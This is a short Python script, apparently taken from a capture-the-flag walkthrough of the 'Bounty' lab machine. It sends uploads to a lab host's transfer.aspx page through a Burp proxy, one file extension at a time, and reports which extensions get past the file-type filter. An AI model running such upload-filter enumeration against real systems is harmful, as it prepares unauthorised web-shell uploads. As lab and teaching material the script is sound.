#!/usr/bin/python3
#
#script taken from ippsec's Bounty walkthrough.  Just a way to check for file type restrictions on the upload page.
#his video link is below
#https://www.youtube.com/watch?v=7ur4om1K98Y


import requests
import re

def TestUpload(filename):
    url = "http://10.10.10.93/transfer.aspx"
    burp = { 'http' : "http://127.0.0.1:8080" }
    s = requests.session()

    r = s.get(url)
    
    ViewState = re.findall(r'__VIEWSTATE" value="(.*?)"', r.text)[0]
    EventValidation = re.findall(r'__EVENTVALIDATION" value="(.*?)"', r.text)[0]

    
    post_data = {
            '__VIEWSTATE' : ViewState,
            '__EVENTVALIDATION' : EventValidation,
            'btnUpload' : 'upload',
            }

    uploaded_file = { 'FileUpload1' : (filename, 'Test Upload') }

    r = s.post(url, files=uploaded_file, data=post_data, proxies=burp)
    return r.text

for extension in open('extensions.list', 'r'):
    #the [:-1] is a quick/dirty way to remove the new line character that was getting added to the upload.
    response = TestUpload('placeholder.' + extension[:-1])
    if "Invalid File" not in response:
        print(extension)
